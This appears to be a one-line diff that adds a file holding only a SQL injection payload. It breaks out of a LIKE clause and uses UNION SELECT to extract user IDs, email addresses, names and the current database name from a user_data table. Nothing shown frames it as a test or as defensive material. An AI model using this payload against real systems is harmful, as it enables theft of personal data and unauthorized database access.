@@ -1,0 +1,1 @@
+%' and 1=2 union select id_user,current_database(),email,nome,null,null from user_data order by id_user --
